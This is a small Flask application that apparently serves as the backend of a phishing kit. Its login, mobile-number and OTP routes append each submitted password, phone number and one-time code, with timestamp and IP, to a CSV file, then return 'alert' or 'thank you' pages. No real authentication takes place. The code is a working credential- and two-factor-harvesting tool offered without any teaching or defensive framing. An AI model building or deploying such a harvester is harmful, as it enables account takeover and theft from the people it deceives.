from flask import Flask, render_template, request, url_for
import csv
from datetime import datetime

app = Flask(__name__)

@app.route('/')
def home():
    return render_template("index.html")

@app.route('/submit', methods=['POST'])
def submit():
    username = request.form['username']
    password = request.form['password']
    captcha = request.form['captcha']
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    ip = request.remote_addr

    with open('logs.csv', 'a', newline='') as file:
        writer = csv.writer(file)
        writer.writerow([timestamp, ip, username, password, captcha])

    return render_template("alert.html")

@app.route('/otp', methods=['GET', 'POST'])
def otp():
    if request.method == 'POST':
        mobile = request.form['mobile']
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        ip = request.remote_addr

        with open('logs.csv', 'a', newline='') as file:
            writer = csv.writer(file)
            writer.writerow([timestamp, ip, "MOBILE", mobile, ""])

        return render_template("otp_submit.html")
    return render_template("otp.html")

@app.route('/final', methods=['POST'])
def final():
    otp = request.form['otp']
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    ip = request.remote_addr

    with open('logs.csv', 'a', newline='') as file:
        writer = csv.writer(file)
        writer.writerow([timestamp, ip, "OTP", otp, ""])

    return render_template("thank_you.html")

if __name__ == "__main__":
    app.run(debug=True)